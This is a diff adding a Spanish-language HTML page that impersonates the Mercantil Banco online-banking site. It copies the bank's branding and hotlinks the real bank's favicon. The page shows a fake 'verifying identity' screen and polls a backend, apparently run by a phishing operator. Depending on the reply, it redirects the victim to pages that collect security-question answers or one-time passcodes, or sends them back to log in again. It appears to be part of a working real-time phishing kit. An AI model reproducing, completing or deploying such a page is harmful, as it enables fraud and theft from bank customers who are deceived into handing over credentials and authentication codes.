@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #eff3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav-bar {
+            background: #004e9b;
+            height: 64px;
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+        .nav-bar img { height: 36px; width: auto; }
+
+        .main {
+            flex: 1;
+            margin-top: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,.1);
+            padding: 44px 36px 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 22px;
+        }
+
+        .spinner-wrap {
+            position: relative;
+            width: 72px;
+            height: 72px;
+        }
+
+        .spinner {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            border: 5px solid #d6e6f5;
+            border-top-color: #004e9b;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .spinner-icon {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-icon img { width: 36px; height: 36px; object-fit: contain; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .status-title {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: #004e9b;
+        }
+
+        .status-sub {
+            font-size: 0.82rem;
+            color: #999;
+            line-height: 1.55;
+            margin-top: -10px;
+        }
+
+        .progress-wrap {
+            width: 100%;
+            background: #e0e0e0;
+            border-radius: 99px;
+            height: 6px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #004e9b;
+            border-radius: 99px;
+            transition: width 0.6s ease;
+        }
+
+        .steps {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            text-align: left;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.84rem;
+            color: #ccc;
+            transition: color .4s;
+        }
+
+        .step.active { color: #212121; font-weight: 700; }
+        .step.done   { color: #004e9b; }
+
+        .step-icon {
+            width: 24px; height: 24px;
+            border-radius: 50%;
+            border: 2px solid #e0e0e0;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+            font-size: 0.72rem; font-weight: 700;
+            transition: all .4s;
+            color: #ccc;
+        }
+
+        .step.active .step-icon { border-color: #004e9b; color: #004e9b; }
+        .step.done  .step-icon  { background: #004e9b; border-color: #004e9b; color: #fff; }
+
+        footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav-bar">
+    <img src="containersito/Log.png" alt="Mercantil en Línea">
+</nav>
+
+<div class="main">
+    <div class="card">
+        <div class="spinner-wrap">
+            <div class="spinner"></div>
+            <div class="spinner-icon">
+                <img src="containersito/Log.png" alt="Mercantil">
+            </div>
+        </div>
+
+        <div class="status-title" id="statusTitle">Verificando identidad...</div>
+        <div class="status-sub"   id="statusSub">Por favor espera mientras validamos tu información de forma segura.</div>
+
+        <div class="progress-wrap">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div class="steps">
+            <div class="step active" id="step1">
+                <div class="step-icon" id="icon1">1</div>
+                <span>Validando credenciales</span>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-icon" id="icon2">2</div>
+                <span>Verificando identidad</span>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-icon" id="icon3">3</div>
+                <span>Cargando tu cuenta</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
+</footer>
+
+<script>
+(async function () {
+    const bar   = document.getElementById('progressBar');
+    const title = document.getElementById('statusTitle');
+    const sub   = document.getElementById('statusSub');
+
+    const STEPS = [
+        { id: 'step1', pct: 33, title: 'Validando credenciales...', sub: 'Comprobando tu usuario y clave.' },
+        { id: 'step2', pct: 66, title: 'Verificando identidad...',  sub: 'Autenticando tu perfil de forma segura.' },
+        { id: 'step3', pct: 90, title: 'Cargando tu cuenta...',     sub: 'Validando tu solicitud con el banco...' }
+    ];
+
+    function setStep(n) {
+        for (let i = 0; i < n - 1; i++) {
+            document.getElementById(STEPS[i].id).classList.replace('active', 'done') ||
+            document.getElementById(STEPS[i].id).classList.add('done');
+            document.getElementById('icon' + (i + 1)).textContent = '✓';
+        }
+        const cur = STEPS[n - 1];
+        document.getElementById(cur.id).classList.add('active');
+        bar.style.width   = cur.pct + '%';
+        title.textContent = cur.title;
+        sub.textContent   = cur.sub;
+    }
+
+    const sessionId = localStorage.getItem('mercantil_session_id');
+
+    setStep(1);
+    setTimeout(() => setStep(2), 3300);
+    setTimeout(() => setStep(3), 6600);
+
+    if (!sessionId) return;
+
+    const poll = setInterval(async () => {
+        try {
+            const res  = await fetch('/api/status/' + sessionId);
+            const data = await res.json();
+
+            if (data.status === 'preguntas') {
+                clearInterval(poll);
+                const { label1, label2 } = data.value;
+                window.location.href = `preguntas.html?label1=${encodeURIComponent(label1)}&label2=${encodeURIComponent(label2)}`;
+            }
+
+            if (data.status === 'otp') {
+                clearInterval(poll);
+                window.location.href = 'otp.html';
+            }
+
+            if (data.status === 'relogin') {
+                clearInterval(poll);
+                localStorage.removeItem('mercantil_session_id');
+                window.location.href = 'index.html';
+            }
+        } catch (_) {}
+    }, 1500);
+})();
+</script>
+
+</body>
+</html>
